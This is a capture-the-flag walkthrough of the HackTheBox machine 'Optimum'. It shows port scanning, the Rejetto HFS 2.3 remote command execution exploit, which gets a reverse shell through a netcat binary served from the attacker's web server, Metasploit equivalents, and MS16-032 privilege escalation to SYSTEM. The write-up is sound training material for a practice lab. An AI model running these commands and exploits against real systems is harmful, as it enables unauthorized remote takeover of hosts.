# Optimum - HackTheBox

![optimum](https://www.google.com/url?sa=i&url=https%3A%2F%2Franakhalil101.medium.com%2Fhack-the-box-optimum-writeup-w-o-metasploit-3a912e1c488c&psig=AOvVaw1gE6xy3KapFG30A0hD4gxM&ust=1615834055429000&source=images&cd=vfe&ved=0CAIQjRxqFwoTCODXwIm5sO8CFQAAAAAdAAAAABAD)

### Enumeration

#### Nmap

```
nmap -T4 -sC -sV -p- 10.10.10.8

80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
```

Only one port is open on the remote machine : Port 80 running a `httpd 2.3` server.

Let's enumerate this service.

#### HTTP / Port 80

##### Without Metasploit

By visiting the website, we find a HttpFileServer with a version number. Let's see if there are any exploits for this version.

```
searchsploit hfs 2.3
```

There appears to be a python exploit that could allow us to execute code remotely. Let's copy it :

- `Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | windows/remote/39161.py`

```
searchsploit -m windows/remote/39161.py
```

There is a note in the script :

```
#EDB Note: You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).  
#          You may need to run it multiple times for success!
```

So, locate and copy `nc.exe` in our current directory :

```
locate nc.exe
cp /usr/share/windows-resources/binaries/nc.exe .
```

Let's start our Web server with Python on port 80 in our directory containing `nc.exe` and edit the script to specify our local IP address and our listening port for the reverse shell :

```
(sudo) python3 -m http.server 80
```

In an other terminal, start a netcat listener :

```
nc -lnvp 1234
```

Run the script :

```
python 39161.py 10.10.10.8 80
```

We have our reverse shell on the target as `Kostas` ! We can retrieve the user flag in `C:\Users\Kostas\Desktop\user.txt.txt`.

##### Metasploit

You can also use the metasploit module `use exploit/windows/http/rejetto_hfs_exec` :

```
msf> use use exploit/windows/http/rejetto_hfs_exec
msf> set rhosts 10.10.10.8
msf> set lhost <local_IP>
msf> exploit
```

We have a meterpreter session on the target !

### Privilege Escalation

Let's use the suggester metasploit module `post/multi/recon/local_exploit_suggester` :

```
meterpreter> background
msf> use post/multi/recon/local_exploit_suggester
msf> set session 1
msf> exploit

[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 37 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
nil versions are discouraged and will be deprecated in Rubygems 4
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Post module execution completed
```

Metasploit tells us that there are 2 exploits to elevate our privileges on the remote machine.

The vulnerability is in the `secondary logon service`, which allows a privilege escalation.

```
msf> use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf> set session 1
msf> set lhost <local_IP>
msf> exploit
```

We've got a `system` shell :

```
C:\Users\kostas\Desktop>whoami

nt authority\system
```

We can retrieve the `root` flag in `C:\Users\Administrator\Desktop\root.txt`.
